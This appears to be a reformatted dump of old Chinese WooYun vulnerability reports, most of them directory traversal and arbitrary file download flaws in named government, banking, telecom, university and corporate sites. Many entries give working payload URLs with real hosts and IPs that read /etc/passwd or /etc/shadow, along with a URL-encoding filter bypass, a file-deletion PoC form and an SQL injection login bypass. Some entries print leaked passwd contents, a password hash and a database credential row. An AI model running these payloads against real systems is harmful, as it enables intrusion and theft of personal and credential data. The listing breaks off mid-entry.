**厂商**: 青岛市住房公积金管理中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体网站为青岛公积金查询网站：http://www.qdgjj.com/个人公积金查询地址 http://www.qdgjj.com:8080/grcx/gjindex.aspx看到是aspx的，先试了下万能密码，发现虽然查询错误，但是没有过滤单引号，真可能会被绕过查询任意人员信息（请自查）试着把访问主域名：http://www.qdgjj.com:8080/发现存在目录遍历，有备份文件可下载~对.net不是很熟悉，所以不知道这个备份文件价值有多高~信息有多敏感，但是像这样一个关系着个人敏感信息（工作单位、身份证号、姓名、公积金信息等）的网站存在目录遍历是很危险的！

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 先把目录遍历修复了吧~没有过滤的问题也多查查，别出现注入漏洞~
---

---
### [wooyun-2015-0154006] 中国联通某系统任意文件读取
**厂商**: 10010.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手工打码116.114.*.*/emac/WEB-INF/web.xml116.114.*.*/emac/WEB-INF/struts-config-log.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2014-076074] 南京农业大学等多所高校教务系统学生信息泄漏
**厂商**: CCERT教育网应急响应组 | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 南京农业大学教务系统存在学生信息泄漏、目录遍历等漏洞。http://jw1.njau.edu.cn/reportFiles/cj/cj_zwcjd.jsp输入学生学号：1221010*目录遍历河北工程大学 http://219.148.85.172:9080/reportFiles/cj/cj_zwcjd.jsp  学号：14092022*山西农业大学http://jwxt.sxau.edu.cn/reportFiles/cj/cj_zwcjd.jsp 学号：2014171321*青岛理工大学http://180.201.80.1/reportFiles/cj/cj_zwcjd.jsp

**POC**: 学号之类的虽然每个学校命名规则不一，但社交网站太流行，很容易得到每个学校学生的学号，哪怕只知道其中一个人，根据一些固定的命名规则，也会推断出其他学号。

**绕过**: 直接利用

**修复**: 学生学号、身份证号、家庭信息等较敏感信息的泄漏对学生来说可以是致命的。比如：很多学校的学生账号设置都是用户名为学号，密码与身份证号码有关，密码找回很多也是跟身份证信息有关。在此就不一一测试了，希望有关学校升级系统或打补丁之类的。
---

---
### [wooyun-2015-098604] 中国电信某站点存在任意文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：http://zhidao.hb.ct10000.com任意下载地址链接，直接下载etc/passwd：http://zhidao.hb.ct10000.com/fileDownLoadAppendix.do?fileName=1.txt&path=../../../../../../../../etc/passwd漏洞证明：<code>root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shu

**POC**: RT

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0114908] 某视频监控系统文件任意遍历(影响上万多用户)
**厂商**: XWebPlay | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。无需登录情况任意遍历系统文件下载（以windwos文件夹内文件为例）

**POC**: 利用方式：http://39.187.12.253/../../WINDOWS/system32/drivers/etc/hosts部分案例：http://inversa.nvdvr.net:8080/http://61-221-215-40.hinet-ip.hinet.net/http://119.145.201.6/http://www.fashicn.com:8081/http://yyshoes.nvdvr.net:8082/http://220-128-132-92.hinet-ip.hinet.net/http://gxyey2.nvdvr.net:8888/http://dga

**绕过**: 直接利用

**修复**: 联系厂商
---

---
### [wooyun-2015-0149488] 易宝支付某系统任意文件下载漏洞
**厂商**: 易宝支付 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 易宝支付某系统任意文件下载漏洞https://online.yeepay.com/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级版本
---

---
### [wooyun-2013-034784] 东莞市住房公积金管理中心任意文件下载
**厂商**: 东莞市住房公积金管理中心 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dggjj.dg.gov.cn/tbdownload/downloadfile.asp?strfilenm=文件地址

**POC**: http://dggjj.dg.gov.cn/tbdownload/downloadfile.asp?strfilenm=../inc/conn.asp

**绕过**: 直接利用

**修复**: 过滤+限制
---

---
### [wooyun-2014-088420] 手机中国某系统任意文件读取
**厂商**: 手机中国 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.cnmo.com/login.php?Lang=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 呢
---

---
### [wooyun-2015-0136855] 快钱某系统存在任意文件下载漏洞
**厂商**: 快钱 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://open.99bill.com/menu!AttachDownload.do?attach=attach参数没过滤http://open.99bill.com/menu!AttachDownload.do?attach=../../../../../../etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: rt
---

---
### [wooyun-2016-0176384] Locojoy服务器配置不当导致任意文件读取漏洞（可读shadow）
**厂商**: 北京乐动卓越科技有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两台服务器：file.locojoy.comt1imgserver2.locojoy.com直接读取发现是过滤的：http://file.locojoy.com/../../../../../../../../../../../../../etc/passwd

**POC**: URL编码绕过，可读shadow文件1.http://file.locojoy.com/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow2.http://t1imgserver2.locojoy.com/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-053692] 中华人民共和国国家邮政局任意文件下载
**厂商**: 国家邮政局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞位置：zyjd.spb.gov.cn/downloadaction.actionPOST：fileName=00&filetype=.jsp&fileurl=WEB-INF/web.xml&Submit=%cf%c2%d4%d8fileurl无保护，任意文件可下载web.xmlstruts.xml

**POC**: web.xmlstruts.xml

**绕过**: 直接利用

**修复**: 严格控制文件下载逻辑，避免全站源码+配置文件被下载
---

---
### [wooyun-2015-0122720] 中国电信tv189备份服务器任意文件下载(包括前端后台)
**厂商**: 天翼视讯传媒有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件遍历下载，泄露源码API相关等涉及相关域名：http://taste.tv189.com /http://v.tv189.com/http://so.tv189.com/http://ifengvip.tv189.com/http://hi.tv189.com/http://my.tv189.com/http://yx.tv189.com/

**POC**: http://180.166.93.75/preview_env/三方相关接口：腾讯 2.0接口新浪微信等public function actionTxwbcallbacklogin(){header('Content-Type: text/html; charset=utf-8');$LogicOauth = new LogicOauth;$mykey = Yii::app()->request->getParam($this->mykey);$mykeys = LogicRedis::get($mykey);//var_dump($mykeys);$last_key = $LogicOa

**绕过**: 直接利用

**修复**: 配置修改
---

---
### [wooyun-2012-07412] 某市电发厂SIS系统逻辑缺陷和目录遍历
**厂商**: 某市发电公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是由于涉事系统的敏感性和系统的脆弱性，出于保护的目的其详细地址将通过私信方式发给cncert，以下只给出概念性的截图证明，其敏感信息均已加码

**POC**: 所存在的隐患如下1，输入已存在的用户名，例如admin，以及随便的密码，系统提示密码错误后，再刷新当前页面，即可使用疑似Guest进入监控系统（疑似为系统策略所定制）2，WebDav方式的遍历3，程序权限控制失误，可越权对生产信息进行查看（修改）

**绕过**: 直接利用

**修复**: 取消目录浏览，加强验证策略，或更新系统
---

---
### [wooyun-2012-010331] 多个政府网站数据库链接信息泄露
**厂商**: gov | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 吉林省人民政府新闻办数据库信息泄露http://www.jlio.gov.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php贵州省民政厅数据库信息泄露http://www.gzsmzt.gov.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0171518] DTcms任意文件删除(继续绕过补丁)
**厂商**: dtcms.net | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 继续绕过补丁删除。private void UpLoadFile(HttpContext context)程序逻辑是上传文件，删除上次的旧文件。删除路径必须已upload开头，有不能有../，但是windows可以有..\跳转路径简单的poc<html xmlns="http://www.w3.org/1999/xhtml" ><head><title>upload</title></head><body><form method="post" action="http://demo.dtcms.net/tools/upload_ajax.ashx?DelFilePath=..\upload\..\robots.txt" enctype="multipart/form-data"" ><input type="file" name="Filedata" /><input type="sub

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 不能有..
---

---
### [wooyun-2015-0159787] 恒安标准某处文件下载（涉及其数据库文件和公司内部信息）
**厂商**: 恒安标准 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.hengansl.com/data/

**POC**: 再来一个地方http://oa.hengansl.com/weaver/weaver.email.FileDownloadLocation?download=1&fileid=1还有很多，就不一一截图了....

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2015-092418] 微拍某子域名大量重要敏感信息泄漏+目录遍历
**厂商**: 微拍 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过谷歌关键字查询得到http://1004.ent.weipai.cn/etc/htpasswd.usersadmin:$apr1$WjPfXhjj$zxzpW.wchE.aSP3r5plr11感觉应该是某个登录密码- -,我网卡党..没去试。http://ent.weipai.cn/可以遍历好多文件 http://ent.weipai.cn/data/Gateway/

**POC**: http://1004.ent.weipai.cn/etc/htpasswd.usersadmin:$apr1$WjPfXhjj$zxzpW.wchE.aSP3r5plr11

**绕过**: 直接利用

**修复**: - -别解析到那里就行.话说有没有妹子送啊~
---

---
### [wooyun-2015-093550] 帝友p2p新业务目录遍历
**厂商**: 厦门帝网信息科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x00 说明帝友p2p（http://www.dyp2p.com）的新业务，帝友云（http://www.diyou.cn）0x01 思路一般新业务上线，都会有些许遗漏的地方。假如是加急上线，那么更容易粗心了，这也是人之常情。所以看到帝友有新的业务上线，我赶紧来瞅瞅(我水平不高，只能找这些篓子)。虽说官方搞了个什么口令，大门上了道锁，但是菊花难免不保的时候啊。0x02 套路我一般都是按照套路出牌的>>一边上扫描器，一边人工找篓子。这不，有了防火墙，忒凶。扫描器都范二了后来想了想，试一下常见的那些吧比如wwwroot.zip wwwroot.rar 1.zip之类的还有/data  /system /install 这些文件正好，/data就出事了好像没什么重要的东西，我瞅了瞅rar下载回来了，打开都是些图片、css之类的，而且都是2011年看了一下，其他目录也没啥子发现的，哎哟这个应该算

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不懂
---

---
### [wooyun-2012-08516] 某证券公司任意文件下载（较严重）
**厂商**: 某证券公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hysec.com/hyzq/ghongyuan/HBdownload.jsp该页面POST参数attachName没有对路径进行必要的限制！而且很容易就发现passwd、shadow等文件可轻易被下载，可见权限不一般...

**POC**: 下载etc/passwd:查看下passwd文件：再下载etc/shadow看看:.........and so on!!!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！合理配置web服务权限！
---

---
### [wooyun-2014-049062] 五粮液某站任意文件读取！
**厂商**: 五粮液 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 缺陷url：http://www.wuliangye.com.cn/download.xml?id=28&path=../../../../../../../../../../etc/passwd%00

**POC**: RT，可以送瓶高端的五粮液吗!w.w

**绕过**: 直接利用

**修复**: 攻城尸
---

---
### [wooyun-2014-061577] 大庆市房管局数据库注入并且任意文件下载
**厂商**: 大庆市房产管理局 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站首页：http://www.dqfcj.com.cn/index.net.xml后台地址：http://www.dqfcj.com.cn/maintainAction.do?method=init登录用户名：admin'or'1'='1登录密码：随便打成功登录之截图如下：这个属于数据库注入，后台验证语句应该是经典的：select * from userTable where username='xxxx' and password='xxx';如果是的话改成如下语句能保你一时平安：selelct * from userTable where username='xxx';if (password!='xxx')error!下面再说一下任意文件下载的事情：下载地址：http://www.dqfcj.com.cn/download.jsp?path=http://www.dqfcj.com

**POC**: 同上

**绕过**: 直接利用

**修复**: 同上
---

---
### [wooyun-2016-0200581] 麦兜旅行网某漏洞包含用户敏感信息(包含出团通知/护照/合同/机票行程单/酒店确认通知等)
**厂商**: 麦兜旅行网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载没有加验证，文件ID没有加密，通过文件ld可遍历文件site:maidou.comhttp://maidou.com/file/download.do?fileId=30038id可遍历

**POC**: 大概有40000多份数据，包含出团通知、护照、合同、机票行程单、酒店确认通知

**绕过**: 直接利用

**修复**: 加权限验证
---

---
### [wooyun-2014-075343] 国家电力监管委员会东北监管局任意文件下载及文件遍历
**厂商**: 国家电网公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.任意文件下载http://218.25.82.237/ewl/excel_model/download.jsp?filepath=../../../../../../../../../../../etc/passwd2.文件遍历http://218.25.82.237/ewl/system_manage/

**POC**: 1.root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:m

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0106841] 华夏基金主站文件遍历
**厂商**: 华夏基金 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:http://www.chinaamc.com/portal/cn/second_login.jsp?categoty_link=../../WEB-INF/web.xml%3f&column=1246275754100&link_page=http://www.chinaamc.com/portal/cn/second.jsp&minisite_column=1208583703100参数：categoty_link

**POC**: 1.一些路径2.一些配置文件3.一些系统路径4.查看部分配置文件

**绕过**: 直接利用

**修复**: 权限控制
---

---
### [wooyun-2014-048542] 山东省政协root权限注射及任意文件读取等
**厂商**: 山东省政协 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: .....

**POC**: Target: 		http://www.sdzx.gov.cn/xxgk.php?id=202Host IP:		124.128.34.50Web Server: 	Apache/2.2.9 (APMServ) PHP/5.2.6Powered-by: 	PHP/5.2.6DB Server: 	MySQLResp. Time(avg):	147 msCurrent User: 	root@localhostSql Version: 	5.1.28-rc-communityCurrent DB: 	sdzx_zxSystem User: 	root@localhostHost Name: 	

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09083] 中华人民共和国国土资源部分站任意文件下载漏洞
**厂商**: 中华人民共和国国土资源部 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于时间有限，马上要睡觉拉，就不做进一步渗透了，（不表示只存在这一个漏洞，或许在渗透过程中会遇到更多的配置不得当的地方，希望尽快修复:D ）

**POC**: http://landinfo.mlr.gov.cn/login.do?state=publicFilesDownload&filename=/../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 对于此类漏洞，希望在数据库里增加一个库，专门用于脚本文件调用参数来达到下载的目的。：）
---

---
### [wooyun-2014-087460] 国家开发银行avcon系统任意文件下载泄漏敏感信息
**厂商**: 国家开发银行股份有限公司 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大神的漏洞WooYun: AVCON多媒体通信系统任意文件下载影响两个iphttp://219.142.60.70:8080http://219.142.60.77:8080一个C段都是你们的，这个肯定也是你们的http://219.142.60.70:8080/download.action?filename=../../../../../../etc/shadowhttp://219.142.60.77:8080/download.action?filename=../../../../../../etc/shadow下载/etc/shadow初次审核没过...补充测试的时候，发现漏洞被补了，下载不了了，动作好快啊...根据账号判断不是同一服务器哦，ps :有钱就是任性，一样系统来两套下载/root/.bash_history最后找到配置文件啊O(∩_∩)O哈！opt/avcon/av

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码限制下载过滤 ../../数据库放内网最后 rank 求不坑！！
---

---
### [wooyun-2015-0127123] 人人乐购物网任意文件下载
**厂商**: 人人乐连锁商业集团股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://csbh.com.cn/share/download.jsp?filePath=../../../../../../../etc/shadow&fileName=shadowhttp://csbh.com.cn/share/download.jsp?filePath=../../../../../../../etc/passwd&fileName=passwd

**POC**: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2016-0203499] 北京卡路里科技-keep多处安全漏洞(VMware目录遍历漏洞+用户信息)
**厂商**: gotokeep.com | **年份**: 2016 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京卡路里科技(keep)一个接口：http://123.57.189.194:8000/不少接口VMware目录遍历漏洞root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:1

**POC**: ···

**绕过**: 直接利用

**修复**: 改
---

---
### [wooyun-2015-0132202] Watson控制台管理存在任意系统文件遍历
**厂商**: Schmid | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Watson控制台存在一处目录遍历漏洞，由于没有正确过滤用户提交的HTTP请求，通过目录遍历获取系统文件信息。利用方式：http://url/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

**POC**: 案例：**.**.**.**:8443/**.**.**.**:8443/**.**.**.**:8443/**.**.**.**:8443/**.**.**.**:8080/**.**.**.**/**.**.**.**:8080/**.**.**.**/**.**.**.**/**.**.**.**/

**绕过**: 直接利用

**修复**: 过滤HTTP请求的字符
---

---
### [wooyun-2014-054839] 测绘遥感信息工程国家重点实验室目录遍历后台用户密码泄露
**厂商**: 武汉大学 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历导致数据库泄露

**POC**: http://www.lmars.whu.edu.cn/whuwang/ 遍历http://www.lmars.whu.edu.cn/whuwang/data/backupdata/http://www.lmars.whu.edu.cn/whuwang/data/backupdata/dede_admin_0_87e8a9316bcfceaf.txtVALUES('1','10','whuwang','42438aeba599f88f7480','admin','','','0','2009','202.114.101.12')

**绕过**: 直接利用

**修复**: xxoo-_,
---

---
### [wooyun-2015-0152016] 中海石油气电集团某系统存在多处任意文件下载漏洞
**厂商**: 中国海洋石油总公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://gte.cnoocgas.com:8080/portalhttp://gte.cnoocgas.com:8080/portal/news/download.jsp?urli=/WEB-INF/web.xml&filename=1.txthttp://gte.cnoocgas.com:8080/portal/download.jsp?urli=/WEB-INF/web.xml&filename=1.txthttp://gte.cnoocgas.com:8080/portal/webstamp/download.jsp?urli=/WEB-INF/web.xml&filename=1.txt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0133619] 山东大学某分站信息泄露
**厂商**: 山东大学 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 见漏洞证明

**POC**: 目录遍历http://www.es.sdu.edu.cn/uc/信息泄露http://www.es.sdu.edu.cn/uc/data/logs/201110.php数据库信息http://www.es.sdu.edu.cn/uc/data/config.inc.php等好多

**绕过**: 直接利用

**修复**: 没用就删了，有用就屏蔽掉
---

---
### [wooyun-2013-034838] 皮皮网某站存PHP本地文件包含漏洞
**厂商**: 皮皮网 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 皮皮网文件包含漏洞：http://xshow.pipi.cn/index.php?r=user/openLogin&type=../../../../../../../../../../etc/passwd%00.jpg为什么说是任意文件读取呢？提交一个单引号让他报错：操作出错啦--include(../../../../../../../../../../etc/passwd') [function.include]: failed to open stream: No such file or directory返回前页

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我专业
---

---
### [wooyun-2015-0135251] 上海公交集团从目录遍历到控制4个内部系统35822员工信息
**厂商**: 上海公交集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x00 目录遍历漏洞——获取集团及旗下所有公司员工通信录(包括所在公司、部门、电话、分机、邮箱)http://116.228.188.147:8484/Files/http://116.228.188.147:8484/gcbase/http://116.228.188.147:8484/gcportal/http://116.228.188.147:8484/gcflow/http://116.228.188.147:8484/webmamil/        ......http://116.228.188.147:8484/images/bus/bmgz/yg02.gif  领导信息http://116.228.188.147:8484/gcbase/components/addressbook/myAddressBook.jsp  公司内部通信录http://116.228.18

**POC**: 如上~

**绕过**: 直接利用

**修复**: 总结一下同一站上主要有如下四个大系统(人事..等系统不算在内)：http://116.228.188.147:8484/gcbase   协同办公系统http://116.228.188.147:8484/gcportal  协同办公平台管理系统http://116.228.188.147:8484
---

---
### [wooyun-2014-058703] 视频影音系列#4.爱奇艺某测试服务器多组源码&mysql信息泄露
